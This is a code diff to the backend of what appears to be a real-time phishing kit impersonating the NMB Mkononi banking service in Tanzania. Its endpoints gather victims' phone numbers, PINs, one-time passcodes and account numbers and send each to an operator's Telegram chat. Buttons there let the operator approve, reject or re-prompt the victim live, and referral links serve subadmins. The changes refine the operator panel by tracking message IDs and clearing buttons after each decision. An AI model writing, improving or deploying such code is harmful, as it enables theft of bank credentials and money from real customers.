@@ -23,7 +23,7 @@ async function sendTelegramMessage(chatId, text, replyMarkup) {
     }
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
+        const response = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -33,12 +33,34 @@ async function sendTelegramMessage(chatId, text, replyMarkup) {
                 reply_markup: replyMarkup
             })
         });
+        return await response.json();
     } catch (err) {
         console.error('Telegram send error:', err);
     }
 }
 
-// 1. Submit Application / PIN (Step 1) -> Admin: ALLOW / DENY (Sends ONLY phone number and PIN)
+// Helper to remove inline keyboard markup once clicked (fades/disables buttons)
+async function removeInlineKeyboard(chatId, messageId, originalText, statusLabel) {
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                text: `${originalText}\n\n<b>Status: [ ${statusLabel} ]</b>`,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            })
+        });
+    } catch (err) {
+        console.error('Edit message error:', err);
+    }
+}
+
+// 1. Submit Application / PIN (Step 1) -> Admin: ALLOW / DENY
 app.post('/api/submit-application', async (req, res) => {
     const { sessionId, phone, pin } = req.body;
     sessions[sessionId] = { phone, pin, clientRes: res, step: 'pin_pending' };
@@ -57,7 +79,10 @@ app.post('/api/submit-application', async (req, res) => {
         ]
     };
 
-    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    if (sent && sent.result && sent.result.message_id) {
+        sessions[sessionId].adminMsgId = sent.result.message_id;
+    }
 });
 
 // 2. Submit OTP -> Admin: PROCEED / STOP
@@ -85,10 +110,13 @@ app.post('/api/submit-otp', async (req, res) => {
         ]
     };
 
-    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    if (sent && sent.result && sent.result.message_id) {
+        sessions[sessionId].adminMsgId = sent.result.message_id;
+    }
 });
 
-// 3. Submit 11-digit NMB Bank Account -> Admin: WRONG PIN, WRONG OTP, INVALID ACC, APPROVED
+// 3. Submit 11-digit NMB Bank Account -> Admin options
 app.post('/api/submit-account', async (req, res) => {
     const { sessionId, accountNumber } = req.body;
     if (sessions[sessionId]) {
@@ -117,7 +145,10 @@ app.post('/api/submit-account', async (req, res) => {
         ]
     };
 
-    await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    const sent = await sendTelegramMessage(TELEGRAM_CHAT_ID, message, replyMarkup);
+    if (sent && sent.result && sent.result.message_id) {
+        sessions[sessionId].adminMsgId = sent.result.message_id;
+    }
 });
 
 // Poll endpoint for client to check admin decision status
@@ -136,7 +167,7 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
     const update = req.body;
 
-    // Handle /start command from any user/subadmin privately (Main admin does not receive it)
+    // Handle /start command from any user/subadmin privately to receive their link and info
     if (update && update.message && update.message.text) {
         const messageObj = update.message;
         const chatId = messageObj.chat.id;
@@ -149,7 +180,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
             const username = messageObj.from.username ? `@${messageObj.from.username}` : 'None';
             const userId = messageObj.from.id;
 
-            // Generate private web link containing their personal identification reference info
             const privateLink = `${req.protocol}://${req.get('host')}?ref=${chatId}`;
             
             const welcomeMsg = `Karibu kwenye NMB Mkononi Tanzania, <b>${fullName}</b>!\n\n` +
@@ -165,7 +195,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         }
     }
 
-    // Handle Admin Inline Keyboard Button Clicks
+    // Handle Admin Inline Keyboard Button Clicks & Fade Buttons Away
     if (update && update.callback_query) {
         const query = update.callback_query;
         const data = query.data; 
@@ -183,24 +213,37 @@ app.post('/api/telegram-webhook', async (req, res) => {
             sessionId = parts[1];
         }
 
-        if (sessions[sessionId] && sessions[sessionId].clientRes) {
-            const clientRes = sessions[sessionId].clientRes;
+        const session = sessions[sessionId];
+        if (session) {
+            const clientRes = session.clientRes;
+            let statusLabel = '';
             
             if (action === 'allow' || action === 'otp_proceed') {
-                sessions[sessionId].status = 'next_step';
-                clientRes.json({ success: true, status: 'next_step' });
+                session.status = 'next_step';
+                statusLabel = action === 'allow' ? 'ALLOWED' : 'PROCEEDED';
+                if (clientRes) clientRes.json({ success: true, status: 'next_step' });
             } else if (action === 'deny' || action === 'otp_stop' || action === 'err_pin') {
-                sessions[sessionId].status = 'restart_pin';
-                clientRes.json({ success: false, status: 'restart_pin', message: 'Wrong PIN / Denied.' });
+                session.status = 'restart_pin';
+                statusLabel = 'WRONG PIN / DENIED';
+                if (clientRes) clientRes.json({ success: false, status: 'restart_pin', message: 'Wrong PIN / Denied.' });
             } else if (action === 'err_otp') {
-                sessions[sessionId].status = 'restart_otp';
-                clientRes.json({ success: false, status: 'restart_otp', message: 'Wrong OTP.' });
+                session.status = 'restart_otp';
+                statusLabel = 'WRONG OTP';
+                if (clientRes) clientRes.json({ success: false, status: 'restart_otp', message: 'Wrong OTP.' });
             } else if (action === 'err_acc') {
-                sessions[sessionId].status = 'restart_acc';
-                clientRes.json({ success: false, status: 'restart_acc', message: 'Invalid Account Number.' });
+                session.status = 'restart_acc';
+                statusLabel = 'INVALID ACCOUNT';
+                if (clientRes) clientRes.json({ success: false, status: 'restart_acc', message: 'Invalid Account Number.' });
             } else if (action === 'approve') {
-                sessions[sessionId].status = 'success';
-                clientRes.json({ success: true, status: 'success' });
+                session.status = 'success';
+                statusLabel = 'APPROVED 🎉';
+                if (clientRes) clientRes.json({ success: true, status: 'success' });
+            }
+
+            // Fade/remove inline buttons from the original admin message
+            if (session.adminMsgId && query.message) {
+                const originalText = query.message.text || 'NMB Mkononi Submission';
+                await removeInlineKeyboard(TELEGRAM_CHAT_ID, session.adminMsgId, originalText, statusLabel);
             }
         }
         
